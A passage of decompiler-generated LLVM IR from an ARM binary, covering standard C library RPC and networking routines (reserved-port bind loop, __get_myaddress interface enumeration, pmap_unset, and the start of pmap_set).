  %v2_1a434 = ptrtoint i32* %stack_var_-44 to i32
  br i1 %v3_1a430, label %dec_label_pc_1a440, label %dec_label_pc_1a460

dec_label_pc_1a440:                               ; preds = %entry
  store i32 %v2_1a434, i32* @r0, align 4
  store i32 16, i32* @r2, align 4
  %v0_1a448 = call i32 @__GI_memset()
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v2_1a434, i32* %r5.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  br label %dec_label_pc_1a488

dec_label_pc_1a460:                               ; preds = %entry
  %v2_1a460 = load i8, i8* %arg2, align 1
  %v3_1a460 = zext i8 %v2_1a460 to i32
  store i32 %v3_1a460, i32* %r3.global-to-local, align 4
  %v1_1a464 = add i32 %tmp, 1
  %v2_1a464 = inttoptr i32 %v1_1a464 to i8*
  %v3_1a464 = load i8, i8* %v2_1a464, align 1
  %v4_1a464 = zext i8 %v3_1a464 to i32
  %v4_1a468 = mul nuw nsw i32 %v4_1a464, 256
  %v5_1a468 = or i32 %v4_1a468, %v3_1a460
  store i32 %v5_1a468, i32* %r3.global-to-local, align 4
  %v7_1a46c = icmp eq i32 %v5_1a468, 2
  br i1 %v7_1a46c, label %dec_label_pc_1a488, label %dec_label_pc_1a474

dec_label_pc_1a474:                               ; preds = %dec_label_pc_1a460
  %v0_1a474 = call i32 @__errno_location()
  store i32 96, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  %v2_1a480 = inttoptr i32 %v0_1a474 to i32*
  store i32 96, i32* %v2_1a480, align 4
  %v0_1a574.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1a574

dec_label_pc_1a488:                               ; preds = %dec_label_pc_1a460, %dec_label_pc_1a440
  store i32 ptrtoint (i8** @global_var_2f528.998 to i32), i32* @r4, align 4
  %v3_1a48c = load i8, i8* @global_var_2f529.999, align 1
  %v4_1a48c = zext i8 %v3_1a48c to i32
  %v2_1a490 = load i8, i8* bitcast (i8** @global_var_2f528.998 to i8*), align 4
  %v3_1a490 = zext i8 %v2_1a490 to i32
  %v3_1a494 = mul nuw i32 %v4_1a48c, 16777216
  %v4_1a498 = sdiv i32 %v3_1a494, 65536
  %v5_1a498 = or i32 %v4_1a498, %v3_1a490
  store i32 %v5_1a498, i32* %r3.global-to-local, align 4
  %v7_1a498 = icmp eq i32 %v5_1a498, 0
  br i1 %v7_1a498, label %dec_label_pc_1a4a0, label %dec_label_pc_1a4bc

dec_label_pc_1a4a0:                               ; preds = %dec_label_pc_1a488
  %v0_1a4a0 = call i32 @__libc_getpid()
  %v2_1a4a8 = srem i32 %v0_1a4a0, 424
  %v1_1a4ac = add nsw i32 %v2_1a4a8, 600
  %v3_1a4b0 = sdiv i32 %v1_1a4ac, 256
  store i32 %v3_1a4b0, i32* %r3.global-to-local, align 4
  %v1_1a4b4 = trunc i32 %v3_1a4b0 to i8
  store i8 %v1_1a4b4, i8* @global_var_2f529.999, align 1
  %v1_1a4b8 = trunc i32 %v1_1a4ac to i8
  %v2_1a4b8 = load i32, i32* @r4, align 4
  %v3_1a4b8 = inttoptr i32 %v2_1a4b8 to i8*
  store i8 %v1_1a4b8, i8* %v3_1a4b8, align 1
  br label %dec_label_pc_1a4bc

dec_label_pc_1a4bc:                               ; preds = %dec_label_pc_1a488, %dec_label_pc_1a4a0
  %v0_1a4bc = call i32 @__errno_location()
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 98, i32* %r3.global-to-local, align 4
  store i32 %v0_1a4bc, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  %v2_1a4d0 = inttoptr i32 %v0_1a4bc to i32*
  store i32 98, i32* %v2_1a4d0, align 4
  %v0_1a53c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1a53c

dec_label_pc_1a4d8:                               ; preds = %dec_label_pc_1a568
  %v3_1a4d8 = load i8, i8* inttoptr (i32 add (i32 ptrtoint (i8** @global_var_2f528.998 to i32), i32 1) to i8*), align 1
  %v4_1a4d8 = zext i8 %v3_1a4d8 to i32
  %v2_1a4dc = load i8, i8* bitcast (i8** @global_var_2f528.998 to i8*), align 4
  %v3_1a4dc = zext i8 %v2_1a4dc to i32
  %v4_1a4e0 = mul nuw nsw i32 %v4_1a4d8, 256
  %v5_1a4e0 = or i32 %v3_1a4dc, %v4_1a4e0
  %v1_1a4e4 = add nuw nsw i32 %v5_1a4e0, 1
  %v3_1a4ec = mul nuw nsw i32 %v3_1a4dc, 256
  %v3_1a4f8 = urem i32 %v1_1a4e4, 65536
  store i32 %v3_1a4f8, i32* %ip.global-to-local, align 4
  %v5_1a4fc = or i32 %v3_1a4ec, %v4_1a4d8
  store i32 %v5_1a4fc, i32* %lr.global-to-local, align 4
  %v3_1a504 = mul i32 %v1_1a4e4, 65536
  store i32 %v3_1a4dc, i32* %r3.global-to-local, align 4
  %v3_1a510 = add i32 %v0_1a558, 3
  %v4_1a510 = inttoptr i32 %v3_1a510 to i8*
  store i8 %v2_1a4dc, i8* %v4_1a510, align 1
  %v0_1a514 = load i32, i32* %ip.global-to-local, align 4
  %v3_1a514 = sdiv i32 %v0_1a514, 256
  store i32 %v3_1a514, i32* @r4, align 4
  %v5_1a518 = icmp sgt i32 %v3_1a504, 67043328
  br i1 %v5_1a518, label %bb, label %bb24

bb:                                               ; preds = %dec_label_pc_1a4d8
  store i32 2, i32* %r3.global-to-local, align 4
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_1a4d8, %bb
  %v0_1a51c = load i32, i32* %lr.global-to-local, align 4
  %v1_1a51c = trunc i32 %v0_1a51c to i8
  %v2_1a51c = load i32, i32* %r5.global-to-local, align 4
  %v3_1a51c = add i32 %v2_1a51c, 2
  %v4_1a51c = inttoptr i32 %v3_1a51c to i8*
  store i8 %v1_1a51c, i8* %v4_1a51c, align 1
  %v0_1a520 = load i32, i32* @r4, align 4
  %v1_1a520 = trunc i32 %v0_1a520 to i8
  %v2_1a520 = load i32, i32* %r6.global-to-local, align 4
  %v3_1a520 = add i32 %v2_1a520, 1
  %v4_1a520 = inttoptr i32 %v3_1a520 to i8*
  store i8 %v1_1a520, i8* %v4_1a520, align 1
  br i1 %v5_1a518, label %bb25, label %.thread6

.thread6:                                         ; preds = %bb24
  %v0_1a52c7 = load i32, i32* %ip.global-to-local, align 4
  %v1_1a52c8 = trunc i32 %v0_1a52c7 to i8
  %v2_1a52c9 = load i32, i32* %r6.global-to-local, align 4
  %v3_1a52c10 = inttoptr i32 %v2_1a52c9 to i8*
  store i8 %v1_1a52c8, i8* %v3_1a52c10, align 1
  br label %bb26

bb25:                                             ; preds = %bb24
  %v6_1a524 = load i32, i32* %r3.global-to-local, align 4
  %v7_1a524 = trunc i32 %v6_1a524 to i8
  %v8_1a524 = load i32, i32* %r6.global-to-local, align 4
  %v9_1a524 = add i32 %v8_1a524, 1
  %v10_1a524 = inttoptr i32 %v9_1a524 to i8*
  store i8 %v7_1a524, i8* %v10_1a524, align 1
  %v6_1a528 = load i32, i32* %r3.global-to-local, align 4
  %v7_1a528 = add i32 %v6_1a528, 86
  store i32 %v7_1a528, i32* %r3.global-to-local, align 4
  %v0_1a52c2 = load i32, i32* %ip.global-to-local, align 4
  %v1_1a52c3 = trunc i32 %v0_1a52c2 to i8
  %v2_1a52c4 = load i32, i32* %r6.global-to-local, align 4
  %v3_1a52c5 = inttoptr i32 %v2_1a52c4 to i8*
  store i8 %v1_1a52c3, i8* %v3_1a52c5, align 1
  %v6_1a530 = load i32, i32* %r3.global-to-local, align 4
  %v7_1a530 = trunc i32 %v6_1a530 to i8
  %v8_1a530 = load i32, i32* %r6.global-to-local, align 4
  %v9_1a530 = inttoptr i32 %v8_1a530 to i8*
  store i8 %v7_1a530, i8* %v9_1a530, align 1
  br label %bb26

bb26:                                             ; preds = %.thread6, %bb25
  %v0_1a534 = call i32 @bind()
  store i32 %v0_1a534, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1a53c

dec_label_pc_1a53c:                               ; preds = %dec_label_pc_1a4bc, %bb26
  %v0_1a53c = phi i32 [ %v0_1a53c.pre, %dec_label_pc_1a4bc ], [ %v0_1a534, %bb26 ]
  %tmp27 = icmp slt i32 %v0_1a53c, 0
  %v3_1a53c = zext i1 %tmp27 to i32
  %v0_1a540 = load i32, i32* %r7.global-to-local, align 4
  %v5_1a544 = icmp slt i32 %v0_1a540, 424
  %storemerge = select i1 %v5_1a544, i32 %v3_1a53c, i32 0
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v2_1a54c = icmp eq i32 %storemerge, 0
  store i32 ptrtoint (i8** @global_var_2f528.998 to i32), i32* %r6.global-to-local, align 4
  %v0_1a558 = load i32, i32* %r5.global-to-local, align 4
  %v1_1a560 = add i32 %v0_1a540, 1
  store i32 %v1_1a560, i32* %r7.global-to-local, align 4
  br i1 %v2_1a54c, label %dec_label_pc_1a574, label %dec_label_pc_1a568

dec_label_pc_1a568:                               ; preds = %dec_label_pc_1a53c
  %v0_1a568 = load i32, i32* %r8.global-to-local, align 4
  %v1_1a568 = inttoptr i32 %v0_1a568 to i32*
  %v2_1a568 = load i32, i32* %v1_1a568, align 4
  store i32 %v2_1a568, i32* %r3.global-to-local, align 4
  %v7_1a56c = icmp eq i32 %v2_1a568, 98
  br i1 %v7_1a56c, label %dec_label_pc_1a4d8, label %dec_label_pc_1a574

dec_label_pc_1a574:                               ; preds = %dec_label_pc_1a568, %dec_label_pc_1a53c, %dec_label_pc_1a474
  %v0_1a574 = phi i32 [ %v0_1a574.pre, %dec_label_pc_1a474 ], [ %v0_1a53c, %dec_label_pc_1a53c ], [ %v0_1a53c, %dec_label_pc_1a568 ]
  store i32 %v3_1a42c, i32* @r4, align 4
  ret i32 %v0_1a574

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v0_1a53c, { 1, 2, 0 }
  uselistorder i32 %v3_1a4dc, { 1, 0, 2 }
  uselistorder i32 %v4_1a4d8, { 1, 0 }
  uselistorder i32 %v3_1a4b0, { 1, 0 }
  uselistorder i32 %v1_1a4ac, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 5, 2, 0, 3, 1, 4 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r3.global-to-local, { 7, 0, 1, 2, 4, 5, 3, 6, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 ()* @bind, { 0, 2, 1 }
  uselistorder i32 98, { 1, 0, 2 }
  uselistorder i32 424, { 0, 1, 4, 2, 3 }
  uselistorder i32 ()* @__libc_getpid, { 0, 6, 3, 2, 1, 5, 4 }
  uselistorder i8* @global_var_2f529.999, { 1, 0 }
  uselistorder i8** @global_var_2f528.998, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_2f528.998 to i32), { 2, 0, 1 }
  uselistorder i32 96, { 1, 8, 3, 4, 9, 6, 7, 0, 2, 5 }
  uselistorder label %dec_label_pc_1a53c, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %dec_label_pc_1a4bc, { 1, 0 }
}

define i32 @__get_myaddress(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp13 = call i8 @__decompiler_undefined_function_2()
  %stack_var_-52 = alloca i8, align 1
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4164 = alloca i32, align 4
  %v3_1a588 = load i32, i32* @r4, align 4
  %v9_1a588 = load i32, i32* @r6, align 4
  %v12_1a588 = load i32, i32* @r7, align 4
  %v15_1a588 = load i32, i32* @r8, align 4
  %v18_1a588 = load i32, i32* @sl, align 4
  store i32 %tmp, i32* @r7, align 4
  %v2_1a598 = ptrtoint i32* %stack_var_-4164 to i32
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1a5a4 = call i32 @socket()
  store i32 %v0_1a5a4, i32* @r0, align 4
  store i32 %v0_1a5a4, i32* @r8, align 4
  %v1_1a5a8 = icmp slt i32 %v0_1a5a4, 0
  br i1 %v1_1a5a8, label %.thread, label %dec_label_pc_1a5b4

.thread:                                          ; preds = %entry
  store i32 ptrtoint ([24 x i8]* @global_var_1de0c.1002 to i32), i32* @r0, align 4
  br label %dec_label_pc_1a5ec

dec_label_pc_1a5b4:                               ; preds = %entry
  store i32 4096, i32* %r3.global-to-local, align 4
  %v3_1a5bc = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v3_1a5bc, i32* @lr, align 4
  store i32 35090, i32* %r1.global-to-local, align 4
  %v2_1a5cc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1a5cc, i32* %r2.global-to-local, align 4
  store i32 4096, i32* %stack_var_-36, align 4
  %v3_1a5d8 = call i32 @ioctl(i32 %v0_1a5a4, i32 35090, i32 %v2_1a5cc)
  %v1_1a5dc = icmp slt i32 %v3_1a5d8, 0
  br i1 %v1_1a5dc, label %dec_label_pc_1a5e8, label %dec_label_pc_1a620.preheader

dec_label_pc_1a620.preheader:                     ; preds = %dec_label_pc_1a5b4
  store i32 1, i32* @sl, align 4
  %v4_1a668 = zext i8 %tmp13 to i32
  %v3_1a670 = mul nuw i32 %v4_1a668, 16777216
  %v4_1a674 = sdiv i32 %v3_1a670, 65536
  br label %dec_label_pc_1a620

dec_label_pc_1a5e8:                               ; preds = %dec_label_pc_1a5b4
  store i32 ptrtoint ([53 x i8]* @global_var_1de24.1005 to i32), i32* @r0, align 4
  br label %dec_label_pc_1a5ec

dec_label_pc_1a5ec:                               ; preds = %.thread12, %.thread, %dec_label_pc_1a5e8
  %v0_1a5ec = call i32 @perror()
  %v1_1a5f4 = call i32 @__GI_exit(i32 1)
  %v0_1a5f8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1a5f8

dec_label_pc_1a5f8:                               ; preds = %bb34, %dec_label_pc_1a5ec
  %v0_1a5f8 = phi i32 [ %v0_1a5f8.pre, %dec_label_pc_1a5ec ], [ %v0_1a684, %bb34 ]
  %v1_1a5f8 = inttoptr i32 %v0_1a5f8 to i32*
  %v2_1a5f8 = load i32, i32* %v1_1a5f8, align 4
  %v3_1a5f8 = add i32 %v0_1a5f8, 4
  %v4_1a5f8 = inttoptr i32 %v3_1a5f8 to i32*
  %v5_1a5f8 = load i32, i32* %v4_1a5f8, align 4
  store i32 %v5_1a5f8, i32* %r1.global-to-local, align 4
  %v6_1a5f8 = add i32 %v0_1a5f8, 8
  %v7_1a5f8 = inttoptr i32 %v6_1a5f8 to i32*
  %v8_1a5f8 = load i32, i32* %v7_1a5f8, align 4
  store i32 %v8_1a5f8, i32* %r2.global-to-local, align 4
  %v9_1a5f8 = add i32 %v0_1a5f8, 12
  %v10_1a5f8 = inttoptr i32 %v9_1a5f8 to i32*
  %v11_1a5f8 = load i32, i32* %v10_1a5f8, align 4
  store i32 %v11_1a5f8, i32* %r3.global-to-local, align 4
  %v0_1a5fc = load i32, i32* @r7, align 4
  %v1_1a5fc = inttoptr i32 %v0_1a5fc to i32*
  store i32 %v2_1a5f8, i32* %v1_1a5fc, align 4
  %v3_1a5fc = add i32 %v0_1a5fc, 4
  %v4_1a5fc = inttoptr i32 %v3_1a5fc to i32*
  %v5_1a5fc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1a5fc, i32* %v4_1a5fc, align 4
  %v6_1a5fc = add i32 %v0_1a5fc, 8
  %v7_1a5fc = inttoptr i32 %v6_1a5fc to i32*
  %v8_1a5fc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1a5fc, i32* %v7_1a5fc, align 4
  %v9_1a5fc = add i32 %v0_1a5fc, 12
  %v10_1a5fc = inttoptr i32 %v9_1a5fc to i32*
  %v11_1a5fc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_1a5fc, i32* %v10_1a5fc, align 4
  %v2_1a604 = load i32, i32* @r7, align 4
  %v3_1a604 = add i32 %v2_1a604, 3
  %v4_1a604 = inttoptr i32 %v3_1a604 to i8*
  store i8 111, i8* %v4_1a604, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1a60c = load i32, i32* @r7, align 4
  %v3_1a60c = add i32 %v2_1a60c, 2
  %v4_1a60c = inttoptr i32 %v3_1a60c to i8*
  store i8 0, i8* %v4_1a60c, align 1
  %v0_1a610 = load i32, i32* @r8, align 4
  store i32 %v0_1a610, i32* @r0, align 4
  %v1_1a614 = call i32 @__libc_close(i32 %v0_1a610)
  br label %dec_label_pc_1a6d0

dec_label_pc_1a620:                               ; preds = %bb35, %dec_label_pc_1a620.preheader
  %v0_1a6b837 = phi i32 [ 0, %bb35 ], [ 1, %dec_label_pc_1a620.preheader ]
  store i32 %v3_1a5bc, i32* %r1.global-to-local, align 4
  store i32 %v2_1a598, i32* @r5, align 4
  %v3_1a628 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_1a628, i32* @r6, align 4
  %v2_1a6b04 = icmp eq i32 %v3_1a628, 0
  br i1 %v2_1a6b04, label %dec_label_pc_1a6b8, label %dec_label_pc_1a630

dec_label_pc_1a630:                               ; preds = %dec_label_pc_1a620, %dec_label_pc_1a6a8
  %v0_1a630 = phi i32 [ %v1_1a6a8, %dec_label_pc_1a6a8 ], [ %v2_1a598, %dec_label_pc_1a620 ]
  %v1_1a634 = inttoptr i32 %v0_1a630 to i32*
  %v2_1a634 = load i32, i32* %v1_1a634, align 4
  %v3_1a634 = add i32 %v0_1a630, 4
  %v4_1a634 = inttoptr i32 %v3_1a634 to i32*
  %v5_1a634 = load i32, i32* %v4_1a634, align 4
  store i32 %v5_1a634, i32* %r1.global-to-local, align 4
  %v6_1a634 = add i32 %v0_1a630, 8
  %v7_1a634 = inttoptr i32 %v6_1a634 to i32*
  %v8_1a634 = load i32, i32* %v7_1a634, align 4
  store i32 %v8_1a634, i32* %r2.global-to-local, align 4
  %v9_1a634 = add i32 %v0_1a630, 12
  %v10_1a634 = inttoptr i32 %v9_1a634 to i32*
  %v11_1a634 = load i32, i32* %v10_1a634, align 4
  store i32 %v11_1a634, i32* %r3.global-to-local, align 4
  %v12_1a634 = add i32 %v0_1a630, 16
  store i32 %v12_1a634, i32* @r4, align 4
  store i32 %v2_1a634, i32* %stack_var_-68, align 4
  %v1_1a640 = inttoptr i32 %v12_1a634 to i32*
  %v2_1a640 = load i32, i32* %v1_1a640, align 4
  %v3_1a640 = add i32 %v0_1a630, 20
  %v4_1a640 = inttoptr i32 %v3_1a640 to i32*
  %v5_1a640 = load i32, i32* %v4_1a640, align 4
  store i32 %v5_1a640, i32* %r1.global-to-local, align 4
  %v6_1a640 = add i32 %v0_1a630, 24
  %v7_1a640 = inttoptr i32 %v6_1a640 to i32*
  %v8_1a640 = load i32, i32* %v7_1a640, align 4
  store i32 %v8_1a640, i32* %r2.global-to-local, align 4
  %v9_1a640 = add i32 %v0_1a630, 28
  %v10_1a640 = inttoptr i32 %v9_1a640 to i32*
  %v11_1a640 = load i32, i32* %v10_1a640, align 4
  store i32 %v11_1a640, i32* %r3.global-to-local, align 4
  %v4_1a644 = trunc i32 %v2_1a640 to i8
  store i8 %v4_1a644, i8* %stack_var_-52, align 1
  %v0_1a648 = load i32, i32* @r8, align 4
  store i32 %v0_1a648, i32* @r0, align 4
  store i32 35091, i32* %r1.global-to-local, align 4
  store i32 %v3_1a5bc, i32* %r2.global-to-local, align 4
  %v3_1a654 = call i32 @ioctl(i32 %v0_1a648, i32 35091, i32 %v3_1a5bc)
  %v1_1a658 = icmp slt i32 %v3_1a654, 0
  br i1 %v1_1a658, label %.thread12, label %dec_label_pc_1a664

.thread12:                                        ; preds = %dec_label_pc_1a630
  store i32 ptrtoint ([23 x i8]* @global_var_1de5c.1008 to i32), i32* @r0, align 4
  br label %dec_label_pc_1a5ec

dec_label_pc_1a664:                               ; preds = %dec_label_pc_1a630
  %v3_1a66c = load i8, i8* %stack_var_-52, align 1
  %v4_1a66c = sext i8 %v3_1a66c to i32
  store i32 %v4_1a66c, i32* %r2.global-to-local, align 4
  store i32 %v3_1a670, i32* %r3.global-to-local, align 4
  %v5_1a674 = or i32 %v4_1a66c, %v4_1a674
  store i32 %v5_1a674, i32* %r1.global-to-local, align 4
  %v1_1a678 = urem i32 %v4_1a66c, 2
  %v2_1a678 = icmp eq i32 %v1_1a678, 0
  %v0_1a6a8.pre = load i32, i32* @r5, align 4
  br i1 %v2_1a678, label %dec_label_pc_1a6a8, label %dec_label_pc_1a680

dec_label_pc_1a680:                               ; preds = %dec_label_pc_1a664
  %v1_1a680 = add i32 %v0_1a6a8.pre, 16
  %v2_1a680 = inttoptr i32 %v1_1a680 to i8*
  %v3_1a680 = load i8, i8* %v2_1a680, align 1
  %v4_1a680 = zext i8 %v3_1a680 to i32
  store i32 %v4_1a680, i32* %r3.global-to-local, align 4
  %v0_1a684 = load i32, i32* @r4, align 4
  %v1_1a684 = add i32 %v0_1a684, 1
  %v2_1a684 = inttoptr i32 %v1_1a684 to i8*
  %v3_1a684 = load i8, i8* %v2_1a684, align 1
  %v4_1a684 = zext i8 %v3_1a684 to i32
  store i32 %v4_1a684, i32* %r2.global-to-local, align 4
  %v4_1a688 = mul nuw nsw i32 %v4_1a684, 256
  %v5_1a688 = or i32 %v4_1a688, %v4_1a680
  store i32 %v5_1a688, i32* %r3.global-to-local, align 4
  %v7_1a68c = icmp eq i32 %v5_1a688, 2
  br i1 %v7_1a68c, label %dec_label_pc_1a694, label %dec_label_pc_1a6a8

dec_label_pc_1a694:                               ; preds = %dec_label_pc_1a680
  %v3_1a694 = udiv i32 %v5_1a674, 8
  store i32 %v3_1a694, i32* %r3.global-to-local, align 4
  %v0_1a698 = load i32, i32* @sl, align 4
  %v2_1a698 = icmp eq i32 %v0_1a698, 0
  br i1 %v2_1a698, label %bb, label %bb34

bb:                                               ; preds = %dec_label_pc_1a694
  %v2_1a69c = or i32 %v3_1a694, 1
  store i32 %v2_1a69c, i32* %r3.global-to-local, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_1a694, %bb
  %v0_1a6a0 = phi i32 [ %v3_1a694, %dec_label_pc_1a694 ], [ %v2_1a69c, %bb ]
  %v1_1a6a0 = urem i32 %v0_1a6a0, 2
  %v2_1a6a0 = icmp eq i32 %v1_1a6a0, 0
  br i1 %v2_1a6a0, label %dec_label_pc_1a6a8, label %dec_label_pc_1a5f8

dec_label_pc_1a6a8:                               ; preds = %dec_label_pc_1a664, %bb34, %dec_label_pc_1a680
  %v1_1a6a8 = add i32 %v0_1a6a8.pre, 32
  store i32 %v1_1a6a8, i32* @r5, align 4
  %v0_1a6ac = load i32, i32* @r6, align 4
  %v1_1a6ac = add i32 %v0_1a6ac, -32
  store i32 %v1_1a6ac, i32* @r6, align 4
  %v2_1a6b0 = icmp eq i32 %v1_1a6ac, 0
  br i1 %v2_1a6b0, label %dec_label_pc_1a6b8.loopexit, label %dec_label_pc_1a630

dec_label_pc_1a6b8.loopexit:                      ; preds = %dec_label_pc_1a6a8
  %v0_1a6b8.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_1a6b8

dec_label_pc_1a6b8:                               ; preds = %dec_label_pc_1a6b8.loopexit, %dec_label_pc_1a620
  %v0_1a6b8 = phi i32 [ %v0_1a6b8.pre, %dec_label_pc_1a6b8.loopexit ], [ %v0_1a6b837, %dec_label_pc_1a620 ]
  %v7_1a6b8 = icmp eq i32 %v0_1a6b8, 1
  br i1 %v7_1a6b8, label %bb35, label %dec_label_pc_1a6c4

bb35:                                             ; preds = %dec_label_pc_1a6b8
  store i32 0, i32* @sl, align 4
  br label %dec_label_pc_1a620

dec_label_pc_1a6c4:                               ; preds = %dec_label_pc_1a6b8
  %v0_1a6c4 = load i32, i32* @r8, align 4
  store i32 %v0_1a6c4, i32* @r0, align 4
  %v1_1a6c8 = call i32 @__libc_close(i32 %v0_1a6c4)
  %v0_1a6cc = load i32, i32* @r6, align 4
  br label %dec_label_pc_1a6d0

dec_label_pc_1a6d0:                               ; preds = %dec_label_pc_1a5f8, %dec_label_pc_1a6c4
  %storemerge = phi i32 [ 1, %dec_label_pc_1a5f8 ], [ %v0_1a6cc, %dec_label_pc_1a6c4 ]
  store i32 %v3_1a588, i32* @r4, align 4
  store i32 %v9_1a588, i32* @r6, align 4
  store i32 %v12_1a588, i32* @r7, align 4
  store i32 %v15_1a588, i32* @r8, align 4
  store i32 %v18_1a588, i32* @sl, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_1a6ac, { 1, 0 }
  uselistorder i32 %v1_1a6a8, { 1, 0 }
  uselistorder i32 %v3_1a694, { 2, 1, 0 }
  uselistorder i32 %v0_1a684, { 1, 0 }
  uselistorder i32 %v0_1a630, { 7, 6, 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_1a5f8, { 3, 2, 1, 0 }
  uselistorder i32 %v3_1a5bc, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-52, { 1, 0 }
  uselistorder i32 (i32)* @__libc_close, { 1, 0, 2, 9, 3, 8, 7, 5, 4, 6 }
  uselistorder i8 111, { 1, 2, 0 }
  uselistorder i32 (i32)* @__GI_exit, { 2, 1, 0, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 7, 6, 3, 0, 8, 9, 5, 4 }
  uselistorder i32 35090, { 0, 2, 1 }
  uselistorder i32 4096, { 2, 12, 3, 4, 10, 7, 11, 5, 1, 8, 6, 0, 9 }
  uselistorder i32 ()* @socket, { 0, 2, 1, 7, 6, 5, 4, 3 }
  uselistorder label %dec_label_pc_1a6d0, { 1, 0 }
  uselistorder label %dec_label_pc_1a6a8, { 1, 2, 0 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_1a630, { 1, 0 }
  uselistorder label %dec_label_pc_1a5ec, { 0, 2, 1 }
}

define i32 @__GI_pmap_unset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v6_1a6f0 = load i32, i32* @r5, align 4
  %v2_1a6f8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_1a6f8, i32* @r4, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 -1, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @r6, align 4
  %v2_1a710 = call i32 @__get_myaddress(i32* nonnull %stack_var_-44)
  %v2_1a714 = icmp eq i32 %v2_1a710, 0
  store i32 400, i32* @r5, align 4
  br i1 %v2_1a714, label %dec_label_pc_1a7c0, label %dec_label_pc_1a730

dec_label_pc_1a730:                               ; preds = %entry
  store i32 0, i32* @lr, align 4
  %v2_1a734 = ptrtoint i32* %stack_var_-24 to i32
  %v9_1a74c = call i32 @__GI_clntudp_bufcreate(i32* nonnull %stack_var_-44, i32 100000, i32 2, i32 5, i32 0, i32 %v2_1a734, i32 400, i32 400)
  store i32 %v9_1a74c, i32* %r5.global-to-local, align 4
  %v2_1a750 = icmp eq i32 %v9_1a74c, 0
  br i1 %v2_1a750, label %dec_label_pc_1a7c0, label %dec_label_pc_1a768

dec_label_pc_1a768:                               ; preds = %dec_label_pc_1a730
  %v1_1a77c = add i32 %v9_1a74c, 4
  %v2_1a77c = inttoptr i32 %v1_1a77c to i32*
  %v3_1a77c = load i32, i32* %v2_1a77c, align 4
  %v1_1a7a0 = inttoptr i32 %v3_1a77c to i32*
  %v2_1a7a0 = load i32, i32* %v1_1a7a0, align 4
  call void @__pseudo_branch(i32 %v2_1a7a0)
  %v0_1a7a4 = load i32, i32* %r5.global-to-local, align 4
  %v1_1a7a8 = add i32 %v0_1a7a4, 4
  %v2_1a7a8 = inttoptr i32 %v1_1a7a8 to i32*
  %v3_1a7a8 = load i32, i32* %v2_1a7a8, align 4
  store i32 ptrtoint (i32* @global_var_1a7b4.1018 to i32), i32* @lr, align 4
  %v1_1a7b0 = add i32 %v3_1a7a8, 16
  %v2_1a7b0 = inttoptr i32 %v1_1a7b0 to i32*
  %v3_1a7b0 = load i32, i32* %v2_1a7b0, align 4
  call void @__pseudo_branch(i32 %v3_1a7b0)
  br label %dec_label_pc_1a7c0

dec_label_pc_1a7c0:                               ; preds = %entry, %dec_label_pc_1a730, %dec_label_pc_1a768
  %storemerge = phi i32 [ %tmp11, %dec_label_pc_1a768 ], [ 0, %dec_label_pc_1a730 ], [ 0, %entry ]
  store i32 %v6_1a6f0, i32* %r5.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder label %dec_label_pc_1a7c0, { 2, 1, 0 }
}

define i32 @pmap_set(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v2_1a7e4 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_1a7e4, i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  %v3_1a800 = urem i32 %arg4, 65536
  store i32 %v3_1a800, i32* @r8, align 4
  store i32 -1, i32* %stack_var_-32, align 4
  %v2_1a808 = call i32 @__get_myaddress(i32* nonnull %stack_var_-52)
  %v2_1a80c = icmp eq i32 %v2_1a808, 0
